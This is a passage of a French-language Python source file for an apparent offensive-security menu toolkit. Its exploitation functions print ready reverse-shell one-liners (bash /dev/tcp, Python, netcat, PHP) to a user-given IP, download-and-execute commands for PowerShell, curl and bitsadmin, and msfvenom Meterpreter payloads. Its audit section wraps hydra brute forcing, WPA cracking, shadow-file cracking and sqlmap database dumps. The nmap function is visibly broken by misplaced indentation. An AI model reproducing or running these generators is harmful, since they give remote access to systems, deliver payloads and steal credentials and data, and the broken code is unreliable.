def tool_b64d():
    clear()
    print(f"{C.GRAY}[*] Base64 Decode{C.RESET}\n")
    
    text = get_input("Texte à décoder")
    if not text:
        print(f"{C.GRAY}[!] Texte invalide{C.RESET}")
        pause()
        return
    
    try:
        decoded = base64.b64decode(text.encode()).decode()
        print(f"\n{C.WHITE}[+] Décodé: {C.WHITE}{decoded}{C.RESET}")
    except Exception:
        print(f"{C.GRAY}[!] Décodage impossible{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["b64d"] = tool_b64d

def tool_urle():
    clear()
    print(f"{C.GRAY}[*] URL Encode{C.RESET}\n")
    
    from urllib.parse import quote
    text = get_input("Texte à encoder")
    if not text:
        print(f"{C.GRAY}[!] Texte invalide{C.RESET}")
        pause()
        return
    
    encoded = quote(text)
    print(f"\n{C.WHITE}[+] Encodé: {C.WHITE}{encoded}{C.RESET}")
    pause()

TOOL_FUNCTIONS["urle"] = tool_urle

def tool_urld():
    clear()
    print(f"{C.GRAY}[*] URL Decode{C.RESET}\n")
    
    from urllib.parse import unquote
    text = get_input("Texte à décoder")
    if not text:
        print(f"{C.GRAY}[!] Texte invalide{C.RESET}")
        pause()
        return
    
    try:
        decoded = unquote(text)
        print(f"\n{C.WHITE}[+] Décodé: {C.WHITE}{decoded}{C.RESET}")
    except Exception:
        print(f"{C.GRAY}[!] Décodage impossible{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["urld"] = tool_urld

# ═══════════════════════════════════════════
# SYSTÈME
# ═══════════════════════════════════════════

def tool_sysinfo():
    clear()
    print(f"{C.WHITE}[*] Informations système{C.RESET}\n")
    
    try:
        uname = subprocess.check_output(["uname", "-a"], text=True)
        print(f"{C.WHITE}[+] Système: {C.WHITE}{uname}{C.RESET}")
    except:
        pass
    
    try:
        hostname = socket.gethostname()
        print(f"{C.WHITE}[+] Hôte: {C.WHITE}{hostname}{C.RESET}")
    except:
        pass
    
    try:
        disk = subprocess.check_output(["df", "-h"], text=True)
        print(f"\n{C.WHITE}[i] Disques:{C.RESET}\n{C.WHITE}{disk}{C.RESET}")
    except:
        pass
    
    try:
        mem = subprocess.check_output(["free", "-h"], text=True)
        print(f"{C.WHITE}[i] Mémoire:{C.RESET}\n{C.WHITE}{mem}{C.RESET}")
    except:
        pass
    
    try:
        uptime = subprocess.check_output(["uptime"], text=True)
        print(f"{C.WHITE}[+] Uptime: {C.WHITE}{uptime}{C.RESET}")
    except:
        pass
    
    pause()

TOOL_FUNCTIONS["sysinfo"] = tool_sysinfo

def tool_lsdir():
    clear()
    print(f"{C.WHITE}[*] Liste fichiers{C.RESET}\n")
    
    path = get_input("Répertoire (défaut: .)") or "."
    
    if not os.path.exists(path):
        print(f"{C.GRAY}[!] Répertoire introuvable{C.RESET}")
        pause()
        return
    
    try:
        items = sorted(os.listdir(path))
        print(f"\n{C.WHITE}Total: {len(items)} items{C.RESET}\n")
        
        for item in items:
            full = os.path.join(path, item)
            if os.path.isdir(full):
                print(f"  {C.WHITE}{item}/")
            else:
                size = os.path.getsize(full)
                print(f"  {C.GRAY}{item}  ({size} octets)")
    except Exception as e:
        print(f"{C.GRAY}[!] Erreur: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["lsdir"] = tool_lsdir

# ═══════════════════════════════════════════
# EXPLOITATION
# ═══════════════════════════════════════════

def tool_revshell():
    clear()
    print(f"{C.GRAY}[*] Reverse Shell Generator{C.RESET}\n")
    
    print(f"{C.GRAY}Attention: Utiliser uniquement pour des tests autorisés{C.RESET}\n")
    
    ip = get_input("Ton IP (LHOST)")
    if not ip:
        print(f"{C.GRAY}[!] IP invalide{C.RESET}")
        pause()
        return
    
    try:
        port = int(get_input("Port (LPORT)"))
    except ValueError:
        print(f"{C.GRAY}[!] Port invalide{C.RESET}")
        pause()
        return
    
    print(f"\n{C.WHITE}[*] Commandes générées:{C.RESET}\n")
    
    print(f"{C.WHITE}[Bash]{C.RESET}")
    print(f"  {C.WHITE}bash -i >& /dev/tcp/{ip}/{port} 0>&1{C.RESET}")
    
    print(f"\n{C.WHITE}[Python]{C.RESET}")
    print(f"  {C.WHITE}python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'{C.RESET}")
    
    print(f"\n{C.WHITE}[Netcat]{C.RESET}")
    print(f"  {C.WHITE}nc -e /bin/bash {ip} {port}{C.RESET}")
    
    print(f"\n{C.WHITE}[PHP]{C.RESET}")
    php = f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
    print(f"  {C.WHITE}{php}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["revshell"] = tool_revshell

def tool_encpayload():
    clear()
    print(f"{C.GRAY}[*] Encoder Payload{C.RESET}\n")
    
    payload = get_input("Payload à encoder")
    if not payload:
        print(f"{C.GRAY}[!] Payload invalide{C.RESET}")
        pause()
        return
    
    try:
        encoded = base64.b64encode(payload.encode()).decode()
        
        print(f"\n{C.WHITE}[+] Original:{C.RESET}")
        print(f"  {C.GRAY}{payload}{C.RESET}")
        
        print(f"\n{C.WHITE}[+] Base64:{C.RESET}")
        print(f"  {C.WHITE}{encoded}{C.RESET}")
        
        print(f"\n{C.WHITE}[+] Decoder (Bash):{C.RESET}")
        print(f"  {C.GRAY}echo '{encoded}' | base64 -d{C.RESET}")
        
        print(f"\n{C.WHITE}[+] Decoder (Python):{C.RESET}")
        print(f"  {C.GRAY}python3 -c \"import base64;print(base64.b64decode('{encoded}').decode())\"{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Erreur: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["encpayload"] = tool_encpayload

def tool_decpayload():
    clear()
    print(f"{C.GRAY}[*] Décoder Payload{C.RESET}\n")
    
    encoded = get_input("Texte encodé en Base64")
    if not encoded:
        print(f"{C.GRAY}[!] Texte invalide{C.RESET}")
        pause()
        return
    
    try:
        decoded = base64.b64decode(encoded.encode()).decode()
        print(f"\n{C.WHITE}[+] Décodé:{C.RESET}")
        print(f"  {C.WHITE}{decoded}{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Décodage impossible: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["decpayload"] = tool_decpayload

def tool_httpserver():
    clear()
    print(f"{C.GRAY}[*] Serveur HTTP{C.RESET}\n")
    
    port = get_input("Port (défaut: 8000)") or "8000"
    directory = get_input("Répertoire (défaut: .)") or "."
    
    if not os.path.exists(directory):
        print(f"{C.GRAY}[!] Répertoire introuvable{C.RESET}")
        pause()
        return
    
    print(f"\n{C.WHITE}[*] Serveur démarré sur http://0.0.0.0:{port}{C.RESET}")
    print(f"{C.GRAY}[*] Ctrl+C pour arrêter{C.RESET}\n")
    
    try:
        os.chdir(directory)
        subprocess.run(["python3", "-m", "http.server", port])
    except KeyboardInterrupt:
        print(f"\n{C.WHITE}[!] Serveur arrêté{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Erreur: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["httpserver"] = tool_httpserver

def tool_dllexec():
    clear()
    print(f"{C.GRAY}[*] Download & Execute{C.RESET}\n")
    
    print(f"{C.GRAY}Attention: Utiliser uniquement pour des tests autorisés{C.RESET}\n")
    
    url = get_input("URL du fichier")
    if not url:
        print(f"{C.GRAY}[!] URL invalide{C.RESET}")
        pause()
        return
    
    print(f"\n{C.WHITE}[*] Commandes générées:{C.RESET}\n")
    
    print(f"{C.WHITE}[PowerShell]{C.RESET}")
    ps = f"powershell -c \"Invoke-WebRequest -Uri '{url}' -OutFile 'out.exe'; Start-Process 'out.exe'\""
    print(f"  {C.WHITE}{ps}{C.RESET}")
    
    print(f"\n{C.WHITE}[Bash]{C.RESET}")
    bash = f"curl -s {url} -o out.exe && chmod +x out.exe && ./out.exe"
    print(f"  {C.WHITE}{bash}{C.RESET}")
    
    print(f"\n{C.WHITE}[CMD Windows]{C.RESET}")
    cmd = f"bitsadmin /transfer job {url} out.exe & out.exe"
    print(f"  {C.WHITE}{cmd}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["dllexec"] = tool_dllexec

def tool_msfgen():
    clear()
    print(f"{C.GRAY}[*] Metasploit One-Liner Generator{C.RESET}\n")
    
    print(f"{C.GRAY}Attention: Utiliser uniquement pour des tests autorisés{C.RESET}\n")
    
    ip = get_input("LHOST (ton IP)")
    if not ip:
        print(f"{C.GRAY}[!] IP invalide{C.RESET}")
        pause()
        return
    
    try:
        port = int(get_input("LPORT (défaut: 4444)") or "4444")
    except ValueError:
        print(f"{C.GRAY}[!] Port invalide{C.RESET}")
        pause()
        return
    
    print(f"\n{C.WHITE}[*] One-liner Meterpreter:{C.RESET}\n")
    
    print(f"{C.WHITE}[Linux x64]{C.RESET}")
    msf1 = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o shell.elf"
    print(f"  {C.GRAY}Génération: {msf1}{C.RESET}")
    print(f"  {C.WHITE}msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT {port}; run'{C.RESET}")
    
    print(f"\n{C.WHITE}[Windows x64]{C.RESET}")
    msf2 = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o shell.exe"
    print(f"  {C.GRAY}Génération: {msf2}{C.RESET}")
    print(f"  {C.WHITE}msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT {port}; run'{C.RESET}")
    
    print(f"\n{C.WHITE}[Python]{C.RESET}")
    msf3 = f"msfvenom -p python/meterpreter/reverse_tcp LHOST={ip} LPORT={port}"
    print(f"  {C.GRAY}Génération: {msf3}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["msfgen"] = tool_msfgen

# ═══════════════════════════════════════════
# AUDIT
# ═══════════════════════════════════════════

def check_install(command):
    result = subprocess.run(["which", command], capture_output=True, text=True)
    return result.returncode == 0

def install_tool(command, apt_name):
    print(f"{C.GRAY}[*] Installation de {command}...{C.RESET}\n")
    try:
        if os.path.exists("/etc/debian_version"):
            subprocess.run(["sudo", "apt", "update"], check=True)
            subprocess.run(["sudo", "apt", "install", "-y", apt_name], check=True)
        elif os.path.exists("/etc/arch_release"):
            subprocess.run(["sudo", "pacman", "-S", "--noconfirm", apt_name], check=True)
        elif os.path.exists("/etc/fedora-release"):
            subprocess.run(["sudo", "dnf", "install", "-y", apt_name], check=True)
        else:
            return False
        return True
    except:
        return False

def tool_nmap():
    clear()
    print(f"{C.GRAY}[*] Nmap{C.RESET}\n")
    
    if not check_install("nmap"):
        print(f"{C.GRAY}[!] Nmap non installé{C.RESET}\n")
        install = input(f"{C.WHITE}[?] Installer ? (o/n): {C.RESET}").strip().lower()
        if install == "o":
            if install_tool("nmap", "nmap"):
                print(f"{C.WHITE}[+] Installation terminée{C.RESET}\n")
            else:
                print(f"{C.GRAY}[!] Installation échouée{C.RESET}")
                pause()
                return
        else:
            pause()
            return
    
    target = get_input_ip("IP ou plage (ex: 192.168.1.1 ou 192.168.1.0/24)")
    if not target:
        pause()
        return
    
    print(f"\n{C.GRAY}[*] Scan en cours...{C.RESET}\n")
    
    print(f"{C.GRAY}Types de scan:{C.RESET}")
    print(f"{C.WHITE}[1]{C.RESET} Scan rapide (-F)")
    print(f"{C.WHITE}[2]{C.RESET} Scan complet (-A)")
    print(f"{C.WHITE}[3]{C.RESET} Scan SYN (-sS)")
    print(f"{C.WHITE}[4]{C.RESET} Scan UDP (-sU)")
    print(f"{C.WHITE}[5]{C.RESET} Personnalisé\n")
    
    scan_type = input(f"{C.GRAY}>>> {C.RESET}").strip()
    
        nmap_args = get_input("Arguments nmap")
        if nmap_args:
            nmap_args = shlex.quote(nmap_args)
        else:
            nmap_args = "-sV"
        scans = {
            "1": ["nmap", "-F", target],
            "2": ["nmap", "-A", target],
            "3": ["nmap", "-sS", target],
            "4": ["nmap", "-sU", target],
            "5": ["nmap", nmap_args, target],
        }
    
    cmd = scans.get(scan_type, ["nmap", "-F", target])
    
    try:
        result = subprocess.run(cmd, text=True)
        print(f"{C.WHITE}{result.stdout if result.stdout else result.stderr}{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Erreur: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["nmap"] = tool_nmap

def tool_masscan():
    clear()
    print(f"{C.GRAY}[*] Masscan{C.RESET}\n")
    
    if not check_install("masscan"):
        print(f"{C.GRAY}[!] Masscan non installé{C.RESET}\n")
        install = input(f"{C.WHITE}[?] Installer ? (o/n): {C.RESET}").strip().lower()
        if install == "o":
            if install_tool("masscan", "masscan"):
                print(f"{C.WHITE}[+] Installation terminée{C.RESET}\n")
            else:
                print(f"{C.GRAY}[!] Installation échouée{C.RESET}")
                pause()
                return
        else:
            pause()
            return
    
    target = get_input("IP/plage (ex: 192.168.1.0/24)")
    if not target:
        pause()
        return
    
    ports = get_input("Ports (ex: 1-1000,80,443 ou 'all')") or "1-1000"
    
    print(f"\n{C.GRAY}[*] Scan massif en cours...{C.RESET}\n")
    
    try:
        subprocess.run(["masscan", "-p", ports, target, "--rate", "1000"], timeout=120)
    except KeyboardInterrupt:
        print(f"\n{C.WHITE}[!] Scan arrêté{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Erreur: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["masscan"] = tool_masscan

def tool_aircrack():
    clear()
    print(f"{C.GRAY}[*] Aircrack-ng{C.RESET}\n")
    
    if not check_install("aircrack-ng"):
        print(f"{C.GRAY}[!] Aircrack-ng non installé{C.RESET}\n")
        install = input(f"{C.WHITE}[?] Installer ? (o/n): {C.RESET}").strip().lower()
        if install == "o":
            if install_tool("aircrack-ng", "aircrack-ng"):
                print(f"{C.WHITE}[+] Installation terminée{C.RESET}\n")
            else:
                print(f"{C.GRAY}[!] Installation échouée{C.RESET}")
                pause()
                return
        else:
            pause()
            return
    
    print(f"{C.GRAY}Modules:{C.RESET}\n")
    print(f"{C.WHITE}[1]{C.RESET} airmon-ng (Gestion interfaces WiFi)")
    print(f"{C.WHITE}[2]{C.RESET} airodump-ng (Capturer paquets)")
    print(f"{C.WHITE}[3]{C.RESET} aireplay-ng (Injecter paquets)")
    print(f"{C.WHITE}[4]{C.RESET} aircrack-ng (Cracker WPA/WEP)\n")
    
    choice = input(f"{C.WHITE}└─>{C.RESET} ").strip()
    
    if choice == "1":
        print(f"\n{C.GRAY}[*] Activation du mode monitor:{C.RESET}")
        iface = get_input("Interface WiFi (ex: wlan0)")
        if iface:
            subprocess.run(["sudo", "airmon-ng", "start", iface])
            subprocess.run(["sudo", "airmon-ng"])
    elif choice == "2":
        print(f"\n{C.GRAY}[*] Capture de paquets:{C.RESET}")
        iface = get_input("Interface (ex: wlan0mon)") or "wlan0mon"
        subprocess.run(["sudo", "airodump-ng", iface])
    elif choice == "3":
        print(f"\n{C.GRAY}[*] Injection de paquets:{C.RESET}")
        print(f"{C.GRAY}    aireplay-ng -9 -e ESSID -a MAC_AP wlan0mon{C.RESET}")
        subprocess.run(["sudo", "aireplay-ng", "--help"])
    elif choice == "4":
        print(f"\n{C.GRAY}[*] Crackage WPA/WEP:{C.RESET}")
        capfile = get_input("Fichier de capture (.cap)")
        wordlist = get_input("Wordlist (défaut: rockyou.txt)") or "/usr/share/wordlists/rockyou.txt"
        if capfile:
            subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, capfile])
    
    pause()

TOOL_FUNCTIONS["aircrack"] = tool_aircrack

def tool_nikto():
    clear()
    print(f"{C.GRAY}[*] Nikto{C.RESET}\n")
    
    if not check_install("nikto"):
        print(f"{C.GRAY}[!] Nikto non installé{C.RESET}\n")
        install = input(f"{C.WHITE}[?] Installer ? (o/n): {C.RESET}").strip().lower()
        if install == "o":
            if install_tool("nikto", "nikto"):
                print(f"{C.WHITE}[+] Installation terminée{C.RESET}\n")
            else:
                print(f"{C.GRAY}[!] Installation échouée{C.RESET}")
                pause()
                return
        else:
            pause()
            return
    
    target = get_input("URL cible (ex: http://192.168.1.1)")
    if not target:
        pause()
        return
    
    print(f"\n{C.GRAY}[*] Scan vulnérabilités web...{C.RESET}\n")
    
    try:
        subprocess.run(["nikto", "-h", target, "-o", "nikto_scan.txt"])
        print(f"{C.WHITE}[+] Résultat sauvegardé dans nikto_scan.txt{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Erreur: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["nikto"] = tool_nikto

def tool_hydra():
    clear()
    print(f"{C.GRAY}[*] Hydra{C.RESET}\n")
    
    if not check_install("hydra"):
        print(f"{C.GRAY}[!] Hydra non installé{C.RESET}\n")
        install = input(f"{C.WHITE}[?] Installer ? (o/n): {C.RESET}").strip().lower()
        if install == "o":
            if install_tool("hydra", "hydra"):
                print(f"{C.WHITE}[+] Installation terminée{C.RESET}\n")
            else:
                print(f"{C.GRAY}[!] Installation échouée{C.RESET}")
                pause()
                return
        else:
            pause()
            return
    
    target = get_input("IP cible")
    if not target:
        pause()
        return
    
    service = get_input("Service (ssh, ftp, http, rdp, mysql...)")
    user = get_input("Utilisateur (ou -P pour wordlist)")
    wordlist = get_input("Wordlist (défaut: rockyou.txt)") or "/usr/share/wordlists/rockyou.txt"
    
    print(f"\n{C.GRAY}[*] Attaque brute force en cours...{C.RESET}\n")
    
    if user == "-P":
        cmd = ["hydra", "-l", "admin", "-P", wordlist, target, service]
    else:
        cmd = ["hydra", "-l", user, "-P", wordlist, target, service]
    
    try:
        subprocess.run(cmd)
    except Exception as e:
        print(f"{C.GRAY}[!] Erreur: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["hydra"] = tool_hydra

def tool_john():
    clear()
    print(f"{C.GRAY}[*] John the Ripper{C.RESET}\n")
    
    if not check_install("john"):
        print(f"{C.GRAY}[!] John non installé{C.RESET}\n")
        install = input(f"{C.WHITE}[?] Installer ? (o/n): {C.RESET}").strip().lower()
        if install == "o":
            if install_tool("john", "john"):
                print(f"{C.WHITE}[+] Installation terminée{C.RESET}\n")
            else:
                print(f"{C.GRAY}[!] Installation échouée{C.RESET}")
                pause()
                return
        else:
            pause()
            return
    
    print(f"{C.GRAY}Modes:{C.RESET}\n")
    print(f"{C.WHITE}[1]{C.RESET} Crack hash unique")
    print(f"{C.WHITE}[2]{C.RESET} Crack fichier shadow")
    print(f"{C.WHITE}[3]{C.RESET} Show (afficher hashes)")
    
    choice = input(f"\n{C.GRAY}>>> {C.RESET}").strip()
    
    if choice == "1":
        hash_val = get_input("Hash à cracker")
        wordlist = get_input("Wordlist (défaut: rockyou.txt)") or "/usr/share/wordlists/rockyou.txt"
        if hash_val:
            subprocess.run(["john", "--wordlist=" + wordlist, "--format=raw-md5"], 
                         input=hash_val, text=True)
    elif choice == "2":
        shadow = get_input("Fichier /etc/shadow (necessite root)")
        if shadow and os.path.exists(shadow):
            subprocess.run(["sudo", "john", shadow])
        else:
            print(f"{C.GRAY}[!] Fichier non accessible{C.RESET}")
    elif choice == "3":
        hash_file = get_input("Fichier de hash")
        if hash_file:
            subprocess.run(["john", "--show", hash_file])
    
    pause()

TOOL_FUNCTIONS["john"] = tool_john

def tool_hashcat():
    clear()
    print(f"{C.GRAY}[*] Hashcat{C.RESET}\n")
    
    if not check_install("hashcat"):
        print(f"{C.GRAY}[!] Hashcat non installé{C.RESET}\n")
        install = input(f"{C.WHITE}[?] Installer ? (o/n): {C.RESET}").strip().lower()
        if install == "o":
            if install_tool("hashcat", "hashcat"):
                print(f"{C.WHITE}[+] Installation terminée{C.RESET}\n")
            else:
                print(f"{C.GRAY}[!] Installation échouée{C.RESET}")
                pause()
                return
        else:
            pause()
            return
    
    print(f"{C.GRAY}Types de hash:{C.RESET}")
    print(f"{C.WHITE}0{C.RESET} MD5")
    print(f"{C.WHITE}1000{C.RESET} NTLM")
    print(f"{C.WHITE}1800{C.RESET} sha512crypt")
    print(f"{C.WHITE}22000{C.RESET} WPA-PBKDF2\n")
    
    hash_mode = get_input("Mode hash (défaut: 0 pour MD5)")
    hash_file = get_input("Fichier de hash")
    wordlist = get_input("Wordlist (défaut: rockyou.txt)") or "/usr/share/wordlists/rockyou.txt"
    
    if not hash_file:
        pause()
        return
    
    print(f"\n{C.GRAY}[*] Crack en cours (GPU)...{C.RESET}\n")
    
    try:
        mode = hash_mode or "0"
        subprocess.run(["hashcat", "-m", mode, "-a", "0", hash_file, wordlist, "--force"])
    except Exception as e:
        print(f"{C.GRAY}[!] Erreur: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["hashcat"] = tool_hashcat

def tool_sqlmap():
    clear()
    print(f"{C.GRAY}[*] SQLMap{C.RESET}\n")
    
    if not check_install("sqlmap"):
        print(f"{C.GRAY}[!] SQLMap non installé{C.RESET}\n")
        install = input(f"{C.WHITE}[?] Installer ? (o/n): {C.RESET}").strip().lower()
        if install == "o":
            if install_tool("sqlmap", "sqlmap"):
                print(f"{C.WHITE}[+] Installation terminée{C.RESET}\n")
            else:
                print(f"{C.GRAY}[!] Installation échouée{C.RESET}")
                pause()
                return
        else:
            pause()
            return
    
    target = get_input("URL cible (ex: http://site.com/page?id=1)")
    if not target:
        pause()
        return
    
    print(f"\n{C.GRAY}Actions:{C.RESET}")
    print(f"{C.WHITE}[1]{C.RESET} Détection basique")
    print(f"{C.WHITE}[2]{C.RESET} Extraire bases de données")
    print(f"{C.WHITE}[3]{C.RESET} Extraire tables")
    print(f"{C.WHITE}[4]{C.RESET} Dump complet")
    
    choice = input(f"\n{C.GRAY}>>> {C.RESET}").strip()
    
    cmd = ["sqlmap", "-u", target]
    
    if choice == "2":
        cmd.extend(["--dbs"])
    elif choice == "3":
        db = get_input("Nom de la base")
        cmd.extend(["-D", db, "--tables"])
    elif choice == "4":
        db = get_input("Base de données")
        table = get_input("Table")
        cmd.extend(["-D", db, "-T", table, "--dump"])
    else:
        pass
    
    print(f"\n{C.GRAY}[*] Analyse en cours...{C.RESET}\n")
    
    try:
        subprocess.run(cmd)
    except Exception as e:
        print(f"{C.GRAY}[!] Erreur: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["sqlmap"] = tool_sqlmap

# ═══════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════

def main():
    current_category = None
    current_tools = []
    
    while True:
        clear()
        print_art()
        
        if current_category is None:
            show_categories()
            choice = input(f"{C.WHITE}└─>{C.RESET} ").strip().lower()
            
            if choice == "q":
                print(f"\n{C.WHITE}Au revoir !{C.RESET}\n")
                sys.exit(0)
            
            if choice in CATEGORIES:
                current_category = choice
                current_tools = show_tools_in_category(choice)
        else:
            show_tools_in_category(current_category)
            choice = input(f"{C.WHITE}└─>{C.RESET} ").strip()
            
            if choice == "0":
                current_category = None
                current_tools = []
            else:
                try:
                    idx = int(choice) - 1
                    if 0 <= idx < len(current_tools):
                        tool_key = current_tools[idx]
                        if tool_key in TOOL_FUNCTIONS:
                            TOOL_FUNCTIONS[tool_key]()
                except ValueError:
                    pass

if __name__ == "__main__":
    main()
